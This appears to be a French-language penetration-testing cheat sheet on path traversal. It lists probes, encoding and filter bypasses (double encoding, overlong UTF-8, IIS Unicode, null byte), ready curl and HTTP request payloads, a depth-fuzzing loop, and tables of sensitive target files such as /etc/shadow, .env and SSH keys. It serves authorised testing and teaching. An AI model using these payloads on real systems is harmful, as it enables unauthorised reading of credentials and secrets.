# Path Traversal (Directory Traversal) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre l'exploitation des vulnérabilités de traversée de répertoires (*Path Traversal* / *Directory Traversal*), classée OWASP A03:2021 — Injection.

**Mécanisme central :** un paramètre HTTP contrôlé par l'attaquant est passé directement à une fonction d'entrée/sortie système (lecture, écriture, inclusion) sans assainissement, permettant de remonter dans l'arborescence et d'accéder à des fichiers hors de la racine web (`document root`).

**Distinction avec la LFI :** le Path Traversal vise la **lecture** d'un fichier arbitraire. La LFI (*Local File Inclusion*) en est un cas particulier où le fichier est en plus **inclus et exécuté** par l'application (ex. PHP `include`). La LFI et ses techniques d'escalade vers RCE font l'objet d'une fiche dédiée.

**Outils :** Burp Suite (Repeater, Intruder), `curl`, `ffuf`/`wfuzz`.

**Conditions générales :** techniques applicables sur tout endpoint passant un paramètre de chemin à une fonction d'E/S système, en environnement de test autorisé.

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `PARAM` | Nom du paramètre HTTP vulnérable (`file`, `page`, `template`…) |
| `N` | Profondeur de remontée à ajuster selon l'arborescence de la cible |

> **Note sur la profondeur :** remonter au-delà de la racine `/` ou `C:\` ne provoque pas d'erreur — le chemin reste bloqué à la racine du système de fichiers. Utiliser 8 à 12 répétitions de `../` garantit d'atteindre la racine quel que soit le niveau de profondeur réel de l'application.

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Confirmer une traversée basique | `../../../../etc/passwd` | Premier test, aucun filtre présumé | Contenu de `/etc/passwd` dans la réponse | `realpath()` + vérification de préfixe = non exploitable |
| Contourner un filtrage d'extension `.` | Chemin absolu `/etc/passwd` | Filtre sur `../` mais pas sur les chemins absolus | Fichier retourné sans traversée | Dépend du point d'entrée acceptant un chemin absolu |
| Contourner un `str_replace("../", "")` non récursif | `....//....//etc/passwd` | Le filtre supprime `../` une seule fois sans récursion | Traversée réussie malgré le filtre | Inefficace si le filtre est appliqué récursivement |
| Contourner un filtre texte sur `../` brut | `%2e%2e%2f` (encodage URL) | Filtre cherchant `../` en clair dans la chaîne | Traversée réussie après décodage côté serveur | Sans effet si le filtre normalise avant de tester |
| Contourner un WAF décodant une seule fois | `%252e%252e%252f` (double encodage) | WAF ou reverse proxy décordant avant transmission à l'appli | Traversée réussie après second décodage côté applicatif | Sans effet si le WAF décode récursivement ou l'application ne décode pas |
| Contourner un décodeur UTF-8 laxiste | `..%c0%af` (overlong UTF-8) | Composant acceptant des représentations UTF-8 invalides | Traversée réussie via la représentation non canonique | Rare sur des stacks modernes correctement configurées |
| Contourner un préfixe imposé | `/var/www/images/../../../etc/passwd` | L'application concatène un répertoire fixe avant le paramètre | Traversée réussie après le préfixe imposé | Seule variante utilisable si le préfixe est obligatoire |
| Contourner une extension imposée | `../../../etc/passwd%00.png` | L'application ajoute une extension au nom de fichier | Troncature au null byte, extension ignorée | PHP ≥ 5.3.4 et runtimes modernes : corrigé ; stacks obsolètes uniquement |

---

## 3. Techniques classées par objectif

### 3.1 Détecter

#### Identification des paramètres suspects

**Objectif :** cartographier les paramètres HTTP dont la valeur influence une opération de lecture ou d'inclusion de fichier.

**Quand l'utiliser :** en tout début de test, lors du mapping de l'application.

**Prérequis :** aucun.

**Noms de paramètres à surveiller en priorité :**

```text
?file=       ?page=       ?include=     ?template=
?path=       ?doc=        ?folder=      ?download=
?lang=       ?locale=
```

**Indicateur applicatif complémentaire :** toute balise `<img src="/endpoint?PARAM=nom_fichier.ext">` ou toute URL incluant un nom de fichier avec extension visible.

**Source :** cours fourni, section 3.

#### Sonde basique (traversée directe)

**Objectif :** confirmer qu'un paramètre de chemin n'est pas filtré.

**Prérequis :** paramètre identifié, système d'exploitation cible présumé.

**Syntaxe minimale :**

```bash
# Linux
curl "http://cible.com/page.php?PARAM=../../../../etc/passwd"

# Windows
curl "http://cible.com/page.php?PARAM=..\..\..\..\windows\win.ini"
```

**Automatisation de la profondeur :**

```bash
for i in 1 2 3 4 5 6 7 8; do
  curl -s "http://cible.com/page.php?PARAM=$(printf '../%.0s' $(seq 1 $i))etc/passwd" \
    | grep -q "root:" && echo "Profondeur $i : succès"
done
```

**Signal attendu :** contenu de `/etc/passwd` (présence de `root:x:0:0:`) ou de `win.ini` (présence de `[fonts]` ou `[extensions]`) dans la réponse.

**Interprétation :** la présence du contenu confirme la traversée. Une réponse vide ou une erreur générique ne prouve pas l'absence de vulnérabilité — un filtre partiel peut bloquer uniquement cette syntaxe.

**Source :** cours fourni, sections 2 et 3.

---

### 3.2 Contourner une contrainte identifiée

> **Principe :** tester un seul bypass à la fois et conserver la même cible de fichier entre les tests pour attribuer le succès ou l'échec à la technique testée.

#### Bypass 1 — Chemin absolu

**Objectif :** contourner un filtre supprimant les séquences `../` mais laissant passer les chemins absolus.

**Quand l'utiliser :** la sonde `../` est bloquée mais l'endpoint semble accepter un chemin quelconque.

**Syntaxe minimale :**

```http
GET /loadImage?PARAM=/etc/passwd HTTP/1.1
Host: cible.com
```

**Signal attendu :** fichier retourné sans séquence de traversée.

**Limites :** sans effet si l'application vérifie que le chemin commence par un répertoire autorisé.

**Source :** cours fourni, section 5.1.

#### Bypass 2 — Séquences imbriquées (suffixes absorbés)

**Objectif :** contourner un `str_replace("../", "")` non récursif.

**Quand l'utiliser :** sonde basique bloquée, message d'erreur suggérant une suppression de `../`.

**Principe :** `....//` → après suppression d'une occurrence de `../` au milieu → `../`.

**Syntaxe minimale :**

```text
....//....//....//etc/passwd
....\/\....\/
..././..././etc/passwd
```

**Signal attendu :** traversée réussie malgré le filtre.

**Limites :** inefficace si le filtre est appliqué en boucle jusqu'à ce qu'aucune occurrence ne subsiste.

**Source :** cours fourni, section 5.2.

#### Bypass 3 — Encodage URL standard

**Objectif :** contourner un filtre cherchant `../` en clair dans la chaîne reçue.

**Quand l'utiliser :** filtre texte sur les caractères `.` et `/` bruts.

**Correspondances d'encodage :**

| Séquence brute | Encodage URL |
|---|---|
| `../` | `%2e%2e%2f` |
| `..\` | `%2e%2e%5c` |
| `/` seul | `%2f` |

**Syntaxe minimale :**

```http
GET /loadImage?PARAM=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: cible.com
```

**Signal attendu :** fichier retourné après décodage URL côté serveur.

**Limites :** sans effet si le filtre normalise (décode) l'URL avant de tester la présence de `../`.

**Source :** cours fourni, section 5.3.

#### Bypass 4 — Double encodage URL (WAF / Reverse Proxy)

**Objectif :** contourner un WAF ou un reverse proxy décodant l'URL une seule fois avant de transmettre la requête à l'application, qui effectue un second décodage.

**Quand l'utiliser :** bypass par encodage simple bloqué, présence d'un WAF ou d'un reverse proxy en amont présumée.

**Principe :** `%` s'encode `%25` → `%2e` devient `%252e` ; après un premier décodage par le WAF (`%25` → `%`), l'application reçoit `%2e` qu'elle décode à son tour en `.`.

**Correspondances de double encodage :**

| Séquence brute | Double encodage |
|---|---|
| `../` | `%252e%252e%252f` |
| `..\` | `%252e%252e%255c` |

**Syntaxe minimale :**

```bash
curl "http://cible.com/page.php?PARAM=..%252f..%252f..%252fetc%252fpasswd"
```

**Signal attendu :** traversée réussie après double décodage.

**Limites :** sans effet si le WAF décode récursivement avant d'appliquer ses règles, ou si l'application ne décode pas les paramètres une seconde fois.

**Source :** cours fourni, section 5.4.

#### Bypass 5 — Encodage Overlong UTF-8

**Objectif :** contourner un composant acceptant des représentations UTF-8 non canoniques (multi-octets invalides) de caractères ASCII.

**Quand l'utiliser :** tous les encodages précédents échouent, stack ancienne ou composant natif suspecté d'avoir une gestion UTF-8 laxiste.

**Correspondances overlong UTF-8 :**

| Séquence brute | Overlong UTF-8 |
|---|---|
| `../` | `..%c0%af` ou `%c0%ae%c0%ae%c0%af` |
| `..\` | `..%c1%9c` ou `..%c0%5c` |

**Signal attendu :** traversée réussie via la représentation non canonique.

**Limites :** rare sur des stacks modernes correctement configurées ; à réserver aux cibles identifiées comme utilisant des composants anciens ou des bibliothèques de décodage UTF-8 non conformes.

**Source :** cours fourni, section 5.5.

#### Bypass 6 — Encodage Unicode (IIS)

**Objectif :** cibler des versions d'IIS traitant un encodage Unicode non standard.

**Quand l'utiliser :** cible IIS identifiée, autres bypasses infructueux.

**Correspondances Unicode IIS :**

| Séquence brute | Encodage Unicode IIS |
|---|---|
| `../` | `..%u2215`, `..%u2200`, `..%u002f`, `%u002e%u002e%u002f` |
| `..\` | `..%u2216`, `..%u005c` |

**Signal attendu :** traversée réussie via l'interprétation non standard du caractère Unicode.

**Limites :** historiquement efficace contre certaines versions d'IIS — à vérifier sur la version exacte ciblée.

**Source :** cours fourni, section 5.6.

#### Bypass 7 — Préfixe imposé

**Objectif :** injecter la traversée après un répertoire de base imposé par l'application.

**Quand l'utiliser :** l'application refuse toute valeur ne commençant pas par un chemin de base (ex. `/var/www/images/`).

**Syntaxe minimale :**

```text
/var/www/images/../../../etc/passwd
```

**En paramètre HTTP :**

```http
GET /loadImage?PARAM=/var/www/images/../../../etc/passwd HTTP/1.1
Host: cible.com
```

**Éléments à personnaliser :** préfixe imposé (`/var/www/images/`) — à déduire des erreurs de l'application ou du comportement observé.

**Signal attendu :** traversée réussie en satisfaisant la contrainte de préfixe tout en remontant hors du répertoire autorisé.

**Limites :** sans effet si la validation porte sur le chemin canonisé **après** résolution (méthode correcte), et non sur la chaîne brute reçue.

**Source :** cours fourni, section 5.7.

#### Bypass 8 — Null Byte (extension imposée)

**Objectif :** neutraliser une extension ajoutée par l'application au nom de fichier.

**Quand l'utiliser :** l'application ajoute systématiquement une extension (`.png`, `.php`, etc.) à la valeur reçue avant d'ouvrir le fichier.

**Syntaxe minimale :**

```text
../../../etc/passwd%00.png
```

**Signal attendu :** l'appel système s'arrête au null byte — le fichier `/etc/passwd` est ouvert, `.png` est ignoré.

**Limites :** corrigé en PHP ≥ 5.3.4 et dans les runtimes modernes managés. Applicable uniquement sur des stacks obsolètes ou des composants natifs non maintenus utilisant des appels C sous-jacents sensibles au `\0`.

**Source :** cours fourni, section 5.8.

---

### 3.3 Récupérer une preuve — Fichiers cibles sensibles

**Objectif :** démontrer l'impact de la traversée en accédant à un fichier à haute valeur probatoire.

**Quand l'utiliser :** traversée confirmée, quel que soit le bypass utilisé.

**Fichiers cibles Linux :**

| Chemin | Intérêt |
|---|---|
| `/etc/passwd` | Liste des comptes utilisateurs — preuve de traversée standard |
| `/etc/shadow` | Hashs des mots de passe (nécessite des privilèges élevés) |
| `/etc/issue` | Bannière de version de la distribution OS |
| `/etc/hosts` | Résolution réseau interne |
| `/proc/self/environ` | Variables d'environnement du processus web, tokens applicatifs |
| `/proc/self/cmdline` | Ligne de commande du processus courant |
| `/var/log/auth.log` | Journaux d'authentification |
| `/var/www/html/.env` | Secrets d'application : clés API, identifiants base de données |
| `~/.ssh/id_rsa` | Clé privée SSH (si accessible par le compte web) |
| `/var/log/apache2/access.log` | Log Apache — vecteur de log poisoning vers RCE (voir fiche LFI/RFI) |

**Fichiers cibles Windows :**

| Chemin | Intérêt |
|---|---|
| `C:\Windows\win.ini` | Fichier de configuration standard — preuve de traversée classique |
| `C:\Windows\System32\drivers\etc\hosts` | Résolution réseau interne |
| `C:\inetpub\wwwroot\web.config` | Configuration IIS, secrets et chaînes de connexion |
| `C:\Windows\repair\SAM` | Base SAM de secours (hashs locaux) |
| `C:\Users\<user>\NTUSER.DAT` | Ruche de registre utilisateur |
| `C:\xampp\apache\logs\access.log` | Log Apache sous XAMPP |

**Source :** cours fourni, section 4.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte d'insertion | Variante utile | Différence apportée |
|---|---|---|---|---|
| Traversée basique Linux | `../../../../etc/passwd` | Paramètre GET / POST | `../../../../../../etc/passwd` (profondeur augmentée) | Atteint la racine depuis une arborescence plus profonde |
| Traversée basique Windows | `..\..\..\windows\win.ini` | Paramètre GET / POST | `../../../../windows/win.ini` (slash au lieu de backslash) | Certains serveurs Windows acceptent les deux séparateurs |
| Chemin absolu | `/etc/passwd` | Paramètre GET / POST | `C:\Windows\win.ini` | Windows : chemin absolu avec lettre de lecteur |
| Suffixe absorbé | `....//....//....//etc/passwd` | Paramètre GET / POST | `..././..././etc/passwd` | Variante syntaxique du même principe |
| Encodage URL | `..%2f..%2f..%2fetc%2fpasswd` | Paramètre GET dans l'URL | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` | Encode également les points |
| Double encodage | `..%252f..%252f..%252fetc%252fpasswd` | Paramètre GET dans l'URL | `%252e%252e%252f` | Encode aussi les points en double |
| Overlong UTF-8 | `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd` | Paramètre GET | `%c0%ae%c0%ae%c0%af` | Encode également les points en overlong |
| Préfixe imposé | `/var/www/images/../../../etc/passwd` | Paramètre GET / POST | Adapter le préfixe selon l'arborescence réelle | Le préfixe est la seule variable à adapter |
| Null byte | `../../../etc/passwd%00.png` | Paramètre GET | `../../../etc/passwd%00.jpg` | L'extension après le null byte n'a pas d'importance |

---

## 5. Encodages, formats et représentation des entrées

| Représentation d'origine | Encodage | Contexte | Composant décodant | Effet attendu |
|---|---|---|---|---|
| `.` | `%2e` | URL | Serveur web / application | Contourne un filtre cherchant `.` brut |
| `/` | `%2f` | URL | Serveur web / application | Contourne un filtre cherchant `/` brut |
| `\` | `%5c` | URL | Serveur web / application (Windows) | Séparateur Windows encodé |
| `%` | `%25` | URL | Couche intermédiaire (WAF) | Premier niveau du double encodage — `%25` → `%` après un décodage |
| `%2e` | `%252e` | URL (double encodage) | WAF (1er décodage) puis application (2e décodage) | `%252e` → `%2e` → `.` après deux décodages successifs |
| `/` | `%c0%af` | UTF-8 overlong | Décodeur UTF-8 laxiste | Représentation non canonique d'un `/` ASCII, acceptée par certains composants non conformes |
| `.` | `%c0%ae` | UTF-8 overlong | Décodeur UTF-8 laxiste | Représentation non canonique d'un `.` ASCII |
| `/` | `%u002f` | Unicode (IIS) | IIS (versions anciennes) | Représentation Unicode de `/` traitée comme le caractère ASCII correspondant |

**Ordre de test recommandé** (du plus probable au plus spécifique) :

```text
1. Brut         : ../
2. Encodage URL : %2e%2e%2f
3. Double enc.  : %252e%252e%252f
4. Absorbé      : ....//
5. Absolu       : /etc/passwd
6. Préfixe      : /chemin/fixe/../../../etc/passwd
7. Overlong     : ..%c0%af
8. Unicode IIS  : ..%u002f
9. Null byte    : ...%00.ext  (si extension imposée)
```

---

## 6. Exemples de requêtes HTTP

### 6.1 Traversée basique sur paramètre d'image

```http
# Référence — requête légitime
GET /loadImage?filename=218.png HTTP/1.1
Host: cible.com
```

```http
# Version modifiée — traversée vers /etc/passwd
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: cible.com
```

- **Changement clé :** valeur de `filename` remplacée par une séquence de traversée.
- **Signal recherché :** contenu de `/etc/passwd` dans le corps de la réponse.
- **Ce que cela ne prouve pas seul :** que des fichiers plus sensibles (`.env`, `.ssh/id_rsa`) sont accessibles — tester chaque cible individuellement.

### 6.2 Double encodage pour WAF

```http
# Bypass WAF par double encodage
GET /page.php?file=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: cible.com
```

- **Changement clé :** `/` encodé deux fois (`/` → `%2f` → `%252f`).
- **Pourquoi important :** le WAF reçoit `%252f`, décode en `%2f` et ne voit pas de `/` → laisse passer. L'application reçoit `%2f` et décode en `/`.
- **Prérequis :** WAF décodant une seule fois ; application effectuant un second décodage.
- **Ce que cela ne prouve pas seul :** que le WAF est contournable par toutes les techniques d'encodage — tester une technique à la fois.

### 6.3 Préfixe imposé + traversée

```http
# Requête normale avec préfixe attendu
GET /loadImage?filename=/var/www/images/photo.jpg HTTP/1.1
Host: cible.com
```

```http
# Version modifiée — traversée après le préfixe attendu
GET /loadImage?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: cible.com
```

- **Changement clé :** `/../../../etc/passwd` ajouté après le préfixe imposé.
- **Signal recherché :** contenu de `/etc/passwd` malgré la présence du préfixe.
- **Ce que cela ne prouve pas seul :** que le contrôle de préfixe est absent — peut indiquer que la validation porte sur la chaîne brute et non le chemin canonisé.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| `curl` | Requête HTTP ciblée avec paramètre modifiable | Sonde basique, test d'un bypass précis | `curl "http://cible.com/?PARAM=../../../../etc/passwd"` | Encoder manuellement les caractères spéciaux si nécessaire (`%2f`, `%252f`…) |
| Script shell (boucle `for`) | Automatisation de la profondeur de traversée | Profondeur inconnue, évite les tests manuels répétés | Voir section 3.1 | Filtrer les réponses par taille ou pattern (`grep`) pour détecter un succès |
| Burp Repeater | Modification et renvoi manuel d'une requête | Test de chaque bypass un par un, observation fine de la réponse | Modifier `PARAM=`, comparer les réponses | Pas d'automatisation — à compléter par Intruder pour les tests en volume |
| Burp Intruder | Automatisation d'une liste de payloads | Fuzzing des encodages, des profondeurs, des fichiers cibles | Charger une wordlist de payloads de traversée, observer les tailles de réponse | Bruyant dans les logs de la cible ; nécessiter un filtre sur la taille de réponse pour trier |
| `ffuf` / `wfuzz` | Fuzzing HTTP orienté découverte | Identification des paramètres vulnérables, test de multiples variantes d'encodage | `ffuf -u "http://cible.com/?PARAM=FUZZ" -w traversal-wordlist.txt -mc 200` | Dépend entièrement de la qualité de la wordlist |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Contenu de `/etc/passwd` dans la réponse (`root:x:0:0:`) | Traversée Linux confirmée | Tester un second fichier (`/proc/self/environ`) pour confirmer la portée | Que tous les fichiers sont lisibles — les droits du processus web peuvent restreindre l'accès |
| Contenu de `win.ini` (`[fonts]` ou `[extensions]`) | Traversée Windows confirmée | Tester `C:\inetpub\wwwroot\web.config` pour évaluer l'impact réel | Que tous les chemins Windows sont accessibles — les ACL peuvent restreindre |
| Réponse identique à la référence, sans contenu de fichier | Filtre actif, chemin incorrect, ou droits insuffisants | Tester un bypass différent OU augmenter la profondeur | Que l'endpoint est sécurisé — la syntaxe peut simplement ne pas correspondre au filtre en place |
| Erreur 500 sur un payload de traversée | Le payload atteint la fonction d'E/S et provoque une erreur | Tester une traversée moins profonde ou un fichier différent | Que l'erreur confirme la traversée — peut être due à un refus de lecture du fichier visé |
| Réponse de taille inattendue (plus grande que la normale) | Contenu d'un fichier externe potentiellement inclus | Lire le corps de la réponse et identifier le contenu | Qu'une grande réponse prouve systématiquement la traversée — vérifier le contenu explicitement |
| Bypass par double encodage réussi, standard échoué | WAF ou reverse proxy décodant une seule fois | Confirmer la présence d'un composant intermédiaire (en-têtes de réponse, bannières) | Que tous les encodages sont équivalents — chaque bypass cible un comportement de décodage différent |

**Contrôle comparatif :** toujours envoyer la requête de référence (valeur légitime) puis la requête modifiée, et comparer code HTTP, taille de réponse et contenu avant de conclure.

---

## 9. Variantes de syntaxe et adaptation

#### Adapter la profondeur de traversée

**Problème précis :** le fichier cible n'est pas retourné malgré la présence de la traversée dans la réponse.

**Cause probable :** profondeur insuffisante — la traversée ne remonte pas assez haut par rapport à l'arborescence réelle du document root.

**Règle :** ajouter des `../` supplémentaires jusqu'à 8–12 répétitions. Dépasser la racine est sans effet négatif.

**Ce qui change :** uniquement le nombre de `../` ; le fichier cible et le séparateur restent identiques.

#### Adapter le séparateur selon l'OS

**Problème précis :** traversée Linux non applicable sur une cible Windows.

**Ce qui change :** `../` → `..\`.

| OS | Séparateur | Encodage URL |
|---|---|---|
| Linux / Unix | `../` | `%2e%2e%2f` |
| Windows | `..\` | `%2e%2e%5c` |
| Windows (slash accepté) | `../` | `%2e%2e%2f` |

**Note :** Windows accepte généralement les deux séparateurs (`/` et `\`) — tester les deux si l'un échoue.

#### Choisir le bypass selon la nature du filtre

**Règle :** ne tester qu'un bypass à la fois, en conservant la même cible et la même profondeur.

| Signal observé | Hypothèse de filtre | Bypass à tester |
|---|---|---|
| `../` bloqué, chemin absolu passant | Filtre spécifique sur `../` | Chemin absolu (§5.1) |
| `../` et absolu bloqués, différence sur encodage | Filtre texte sur caractères bruts | Encodage URL `%2e%2e%2f` (§5.3) |
| Encodage simple bloqué par WAF | WAF normalisant les requêtes | Double encodage `%252e%252e%252f` (§5.4) |
| Tous précédents bloqués, stack ancienne | Décodeur laxiste ou IIS ancien | Overlong UTF-8 (§5.5) ou Unicode IIS (§5.6) |
| Erreur sur le fichier cible, préfixe obligatoire visible | Contrainte de répertoire de base | Préfixe imposé (§5.7) |
| Extension ajoutée visible dans l'erreur | Concaténation d'extension côté serveur | Null byte `%00` (§5.8) — stacks obsolètes seulement |

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Réponse identique à la normale (pas de fichier) | Filtre actif, profondeur insuffisante, chemin incorrect | Augmenter la profondeur ; tester un bypass alternatif (un seul à la fois) | Essayer le chemin absolu si `../` est filtré | Que ce vecteur précis est bloqué — pas que l'endpoint est globalement sécurisé |
| Erreur 500 sur le payload | Payload atteint la fonction d'E/S mais provoque une erreur d'accès | Tester un fichier différent (ex. `/etc/hostname` plutôt que `/etc/shadow`) | Réduire la profondeur ou changer la cible | Que le payload atteint la couche d'E/S — droits insuffisants sur ce fichier spécifique |
| Erreur 400 / « Invalid filename » | Validation de format en amont du filtre de traversée | Vérifier si le message d'erreur révèle la contrainte exacte (format attendu, longueur max) | Adapter le format du payload (encodage, type d'extension) | Que la contrainte est de format, pas de sécurité — peut masquer une traversée sous-jacente |
| Bypass encodage simple échoue, double encodage réussit | WAF ou reverse proxy décodant une seule fois | Confirmer la présence d'un composant intermédiaire (en-têtes HTTP `X-Forwarded-For`, `Via`) | Utiliser uniquement le double encodage pour les tests suivants | Que la protection repose sur ce composant — l'application sous-jacente peut être directement vulnérable |
| Null byte sans effet sur extension imposée | Runtime moderne (PHP ≥ 5.3.4 ou équivalent) corrigeant le null byte | Vérifier la version du runtime ou du langage côté serveur | Chercher une autre contrainte d'extension ou changer de technique | Que ce bypass précis est fermé — ne pas supposer que d'autres bypasses le sont également |
| Préfixe imposé avec traversée non résolue | `realpath()` + vérification de préfixe post-canonisation correctement implémentés | Tenter un encodage sur le `/` de la traversée dans le préfixe | Aucun ajustement si la canonisation est stricte | Que la défense est correctement implémentée sur ce point d'entrée |

---

## 11. Checklist d'utilisation

- [ ] Les paramètres HTTP susceptibles d'influencer une opération de fichier sont identifiés.
- [ ] La sonde basique (`../../../../etc/passwd`) a été testée en premier, avant tout bypass.
- [ ] La profondeur a été augmentée progressivement si la sonde basique échoue sans erreur explicite.
- [ ] Un seul bypass est testé à la fois, avec la même cible et la même profondeur entre les tests.
- [ ] La cible de fichier est adaptée à l'OS (Linux vs Windows).
- [ ] Le bypass est choisi en fonction du signal observé (nature du filtre déduite), pas appliqué aléatoirement.
- [ ] La réponse de référence (paramètre légitime) est comparée à la réponse modifiée avant de conclure.
- [ ] Le contenu du fichier retourné est explicitement vérifié (présence de `root:` ou `[fonts]`) avant de documenter la traversée.
- [ ] L'impact réel est évalué en testant des fichiers à haute valeur probatoire (`.env`, `web.config`) après confirmation de la traversée.
- [ ] Les résultats sont reproduits au moins une fois avant d'être documentés comme findings.

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Testing Guide — Testing for Path Traversal (WSTG-AUTHZ-01)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- Voir aussi : fiche complémentaire `cheatsheet-lfi-rfi-upload.md` pour l'escalade d'une traversée vers une LFI/RCE (log poisoning, session poisoning, upload de fichier polyglotte).
